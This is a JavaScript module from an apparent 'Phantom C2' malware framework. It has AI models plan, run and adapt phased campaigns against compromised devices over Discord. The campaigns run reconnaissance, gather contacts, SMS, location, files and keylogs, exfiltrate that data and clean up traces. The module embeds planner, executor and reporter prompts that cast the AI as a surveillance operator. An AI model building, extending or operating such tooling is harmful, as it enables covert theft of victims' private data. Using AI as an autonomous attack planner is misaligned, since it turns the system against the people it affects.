import { aiContext } from './context.js'
import { callAIWithFallback, parseAIResponse, getAvailableProviders } from './swarm.js'
import { COMMAND_DEFS } from './commands.js'
import { analyzeResults } from './analyzer.js'
import { decideNextActions } from './decider.js'

const PHASES = ['RECON', 'GATHER', 'EXFIL', 'CLEANUP', 'REPORT']
const MAX_RETRIES_PER_PHASE = 3
const MAX_CAMPAIGNS_PER_GUILD = 5

const PLANNER_SYSTEM_PROMPT = `You are the Campaign Planner for the Phantom C2 framework.

Your job: Take an operator's high-level objective and break it into a phased campaign plan.

AVAILABLE PHASES:
- RECON: Target identification, connectivity verification, device fingerprinting
- GATHER: Data collection based on objective (contacts, SMS, apps, location, files, grabber)
- EXFIL: Package collected data, upload to exfil destination, deliver to operator
- CLEANUP: Remove traces, verify nothing left behind
- REPORT: Generate comprehensive intelligence summary

Each phase contains a sequence of C2 commands to execute.

RULES:
- Use the MINIMUM number of commands needed
- Each phase should have 1-5 commands
- !target must be the first command if targeting is needed
- Group logically: recon before gather, gather before exfil
- If the objective is ambiguous, suggest the best interpretation
- For sensitive operations (grabber, keylog), mark requiresApproval: true

OUTPUT FORMAT (strict JSON, no markdown):
{
  "analysis": "Your analysis of the objective and campaign approach",
  "targetRequired": true,
  "targetDevice": null,
  "estimatedDuration": "~2-3 minutes",
  "phases": [
    {
      "name": "RECON",
      "commands": [
        {"command": "!target", "args": "<device-name>", "reason": "Why this command"}
      ],
      "requiresApproval": false,
      "successCriteria": "What must succeed for this phase to be complete"
    }
  ],
  "riskLevel": "low|medium|high",
  "ready": false
}

Set ready:true only when the plan is complete and approved by the operator.`

const EXECUTOR_SYSTEM_PROMPT = `You are the Campaign Executor for the Phantom C2 framework.

Your job: Analyze the results of the last phase's command execution and decide what to do next.

Available options:
1. Continue to next phase — phase succeeded
2. Retry with different approach — phase failed but can be retried
3. Adapt plan — phase failed irrecoverably, modify remaining phases
4. Abort campaign — critical failure, cannot continue

OUTPUT FORMAT (strict JSON, no markdown):
{
  "status": "continue|retry|adapt|abort",
  "analysis": "Analysis of what happened",
  "nextCommands": [
    {"command": "!command", "args": "args", "reason": "Why"}
  ],
  "requiresApproval": false,
  "message": "Message to display to operator"
}

If status is "retry", suggest alternative commands.
If status is "adapt", provide modified phase plan.
If status is "abort", explain why.`

const REPORTER_SYSTEM_PROMPT = `You are the Intelligence Report Generator for the Phantom C2 framework.

Your job: Take all collected data from a campaign and generate a comprehensive, actionable intelligence report.

OUTPUT FORMAT (strict JSON, no markdown):
{
  "title": "Campaign report title",
  "classification": "intelligence|intel|data",
  "summary": "Executive summary of findings",
  "keyFindings": ["Finding 1", "Finding 2"],
  "dataCollected": {"type": "count or summary"},
  "recommendations": ["Next step 1", "Next step 2"],
  "rawData": "Full collected data for reference"
}`

const activeCampaigns = new Map()

class Campaign {
  constructor(guildId, userId, objective) {
    this.guildId = guildId
    this.userId = userId
    this.objective = objective
    this.id = `cmp_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`
    this.phases = []
    this.currentPhaseIndex = 0
    this.status = 'planning'
    this.results = []
    this.collectedData = {}
    this.targetDevice = null
    this.startTime = Date.now()
    this.retryCount = 0
    this.phaseRetries = {}
    this.messageId = null
    this.channelId = null
    this.plan = null
  }

  get currentPhase() {
    return this.phases[this.currentPhaseIndex] || null
  }

  get progress() {
    return `${this.currentPhaseIndex}/${this.phases.length} phases`
  }

  get elapsed() {
    const s = Math.floor((Date.now() - this.startTime) / 1000)
    const m = Math.floor(s / 60)
    return m > 0 ? `${m}m ${s % 60}s` : `${s}s`
  }

  toJSON() {
    return {
      id: this.id,
      objective: this.objective,
      status: this.status,
      phase: this.currentPhase?.name || 'done',
      progress: this.progress,
      elapsed: this.elapsed,
      targetDevice: this.targetDevice,
    }
  }
}

class CampaignManager {
  async createCampaign(guildId, userId, objective) {
    const guildCampaigns = activeCampaigns.get(guildId) || new Map()
    if (guildCampaigns.size >= MAX_CAMPAIGNS_PER_GUILD) {
      throw new Error(`Maximum ${MAX_CAMPAIGNS_PER_GUILD} active campaigns per server`)
    }
    const campaign = new Campaign(guildId, userId, objective)
    guildCampaigns.set(campaign.id, campaign)
    activeCampaigns.set(guildId, guildCampaigns)
    return campaign
  }

  async planCampaign(campaign, contextInfo = '') {
    campaign.status = 'planning'
    const input = campaign.objective
      + (campaign.targetDevice ? `\nTarget: ${campaign.targetDevice}` : '')
      + (contextInfo ? `\n\nContext:\n${contextInfo}` : '')

    const result = await callAIWithFallback(PLANNER_SYSTEM_PROMPT, [
      { role: 'user', content: input },
    ], { complexity: 'high' })

    const plan = parseAIResponse(result.result)
    if (!plan.phases || !Array.isArray(plan.phases) || plan.phases.length === 0) {
      throw new Error('AI returned invalid campaign plan')
    }

    campaign.plan = plan
    campaign.phases = plan.phases
    if (plan.targetDevice) campaign.targetDevice = plan.targetDevice
    return plan
  }

  async executePhase(campaign, guild, client) {
    const phase = campaign.currentPhase
    if (!phase) {
      campaign.status = 'completed'
      return { status: 'completed' }
    }

    campaign.status = 'active'
    const phaseKey = phase.name
    if (!campaign.phaseRetries[phaseKey]) campaign.phaseRetries[phaseKey] = 0

    const results = []
    for (const cmd of phase.commands) {
      try {
        const cmdName = cmd.command.replace(/^!/, '')
        const session = aiContext.getSession(campaign.guildId, campaign.userId)
        const targetData = session?.currentTarget || campaign.targetDevice

        if (cmdName === 'target') {
          results.push(`[TARGET] Set target to ${cmd.args}`)
          if (session) session.currentTarget = cmd.args
          campaign.targetDevice = cmd.args
          continue
        }

        if (!targetData && cmdName !== 'target') {
          results.push(`[SKIP ${cmd.command}] No target`)
          continue
        }

        // --- REAL COMMAND EXECUTION via Discord ---
        const targetName = targetData.replace(/^phantom-/, '').toLowerCase()
        const channel = guild.channels.cache.find(ch =>
          ch.name === targetData ||
          ch.name === `phantom-${targetName}` ||
          ch.name.includes(targetName)
        )

        if (channel && channel.isTextBased()) {
          const fullCmd = `${cmd.command} ${cmd.args || ''}`.trim()
          const isGrabber = cmd.command === '!grabber'
          results.push(`[EXEC] Sending: ${fullCmd} — ${cmd.reason}`)

          const sent = await channel.send(fullCmd)

          // Wait for response — poll for messages
          const before = Date.now()
          const timeout = isGrabber ? 120000 : 30000
          const parts = []
          while ((Date.now() - before) < timeout) {
            const msgs = await channel.messages.fetch({ limit: 10 })
            for (const [, m] of msgs) {
              if (!m.author.bot || !m.content) continue
              if (m.id === sent.id) continue
              if (m.content.includes(':heartbeat:') || m.content.includes('**Alive**')) continue
              if (m.createdTimestamp < before - 3000) continue
              const attachments = m.attachments.map(a => `[FILE: ${a.name}]`).join(' ')
              const text = (attachments ? m.content + ' ' + attachments : m.content).slice(0, 1000)
              if (!parts.some(p => p.includes(text.slice(0, 80)))) {
                parts.push(text)
              }
            }
            if (parts.length > 0) {
              await new Promise(r => setTimeout(r, 3000))
            } else {
              await new Promise(r => setTimeout(r, 2000))
            }
          }

          const combined = parts.join('\n')
          if (combined) {
            results.push(`[RESULT] ${combined.slice(0, 3000)}`)
            if (isGrabber) {
              try {
                const analysis = await analyzeResults(combined, null)
                results.push(`[ANALYZER] ${analysis.summary || 'Analysis complete'}`)
                const decision = await decideNextActions(analysis, null)
                if (decision.commands?.length) {
                  results.push(`[DECIDER] Next actions: ${decision.commands.map(c => c.command + (c.args ? ' ' + c.args : '')).join(', ')}`)
                }
              } catch {}
            }
          } else {
            results.push(`[RESULT] No response captured`)
          }
        } else {
          results.push(`[EXEC] ${cmd.command} ${cmd.args || ''} — ${cmd.reason}`)
          results.push('[RESULT] Target channel not found — logged only')
        }
      } catch (e) {
        results.push(`[FAIL] ${cmd.command}: ${e.message}`)
      }
    }

    const evalResult = await this.evaluatePhase(campaign, phase, results)
    campaign.results.push(...results)

    switch (evalResult.status) {
      case 'continue':
        campaign.currentPhaseIndex++
        campaign.retryCount = 0
        return { status: 'phase_complete', phase: phase.name, message: evalResult.message }

      case 'retry': {
        campaign.phaseRetries[phaseKey]++
        if (campaign.phaseRetries[phaseKey] >= MAX_RETRIES_PER_PHASE) {
          const adaptResult = await this.adaptCampaign(campaign, results)
          return { status: 'adapting', message: adaptResult.message, phase: phase.name }
        }
        phase.commands = evalResult.nextCommands || phase.commands
        return { status: 'retrying', message: evalResult.message, phase: phase.name }
      }

      case 'adapt': {
        const adaptResult = await this.adaptCampaign(campaign, results)
        return { status: 'adapting', message: adaptResult.message, phase: phase.name }
      }

      case 'abort':
        campaign.status = 'failed'
        return { status: 'failed', message: evalResult.message || 'Campaign aborted', phase: phase.name }
    }
  }

  async evaluatePhase(campaign, phase, results) {
    const input = `Phase: ${phase.name}\nCommands executed:\n${results.join('\n')}\n\nEvaluate and decide next action.`
    try {
      const result = await callAIWithFallback(EXECUTOR_SYSTEM_PROMPT, [
        { role: 'user', content: input },
      ], { complexity: 'medium' })
      return parseAIResponse(result.result)
    } catch {
      return { status: 'continue', analysis: 'Phase completed', nextCommands: [], message: 'Continuing to next phase' }
    }
  }

  async adaptCampaign(campaign, results) {
    const input = `Campaign objective: ${campaign.objective}\nPhases completed: ${campaign.currentPhaseIndex}/${campaign.phases.length}\nResults so far:\n${results.join('\n')}\n\nCurrent phase failed. Adapt the remaining campaign plan.`
    try {
      const result = await callAIWithFallback(PLANNER_SYSTEM_PROMPT, [
        { role: 'user', content: input },
      ], { complexity: 'high' })
      const plan = parseAIResponse(result.result)
      if (plan.phases) {
        const remaining = plan.phases
        campaign.phases = [...campaign.phases.slice(0, campaign.currentPhaseIndex), ...remaining]
      }
      return { status: 'adapted', message: 'Campaign plan adapted', plan }
    } catch {
      campaign.status = 'failed'
      return { status: 'failed', message: 'Failed to adapt campaign' }
    }
  }

  async generateReport(campaign) {
    const input = `Campaign objective: ${campaign.objective}\nDuration: ${campaign.elapsed}\n\nCollected Data:\n${campaign.results.join('\n')}\n\nGenerate comprehensive intelligence report.`
    try {
      const result = await callAIWithFallback(REPORTER_SYSTEM_PROMPT, [
        { role: 'user', content: input },
      ], { complexity: 'medium' })
      return parseAIResponse(result.result)
    } catch {
      return {
        title: 'Campaign Complete',
        summary: 'Data collection finished',
        keyFindings: ['Campaign executed successfully'],
        recommendations: ['Review collected data'],
        rawData: campaign.results.join('\n'),
      }
    }
  }

  getCampaign(guildId, userId, campaignId = null) {
    const guildCampaigns = activeCampaigns.get(guildId)
    if (!guildCampaigns) return null
    if (campaignId) return guildCampaigns.get(campaignId)
    const userCampaigns = [...guildCampaigns.values()]
      .filter(c => c.userId === userId)
      .sort((a, b) => b.startTime - a.startTime)
    return userCampaigns[0] || null
  }

  listCampaigns(guildId, userId = null) {
    const guildCampaigns = activeCampaigns.get(guildId)
    if (!guildCampaigns) return []
    return [...guildCampaigns.values()]
      .filter(c => !userId || c.userId === userId)
      .map(c => c.toJSON())
  }

  cancelCampaign(guildId, userId, campaignId) {
    const guildCampaigns = activeCampaigns.get(guildId)
    if (!guildCampaigns) return false
    const campaign = guildCampaigns.get(campaignId)
    if (!campaign || campaign.userId !== userId) return false
    campaign.status = 'aborted'
    return true
  }

  cleanup() {
    const now = Date.now()
    for (const [guildId, guildCampaigns] of activeCampaigns) {
      for (const [id, campaign] of guildCampaigns) {
        if (campaign.status === 'completed' || campaign.status === 'failed' || campaign.status === 'aborted') {
          if (now - campaign.startTime > 3600000) guildCampaigns.delete(id)
        }
      }
      if (guildCampaigns.size === 0) activeCampaigns.delete(guildId)
    }
  }

  getStatus() {
    let total = 0
    let active = 0
    for (const guildCampaigns of activeCampaigns.values()) {
      for (const c of guildCampaigns.values()) {
        total++
        if (c.status === 'active' || c.status === 'planning') active++
      }
    }
    return { total, active }
  }
}

export const campaignManager = new CampaignManager()
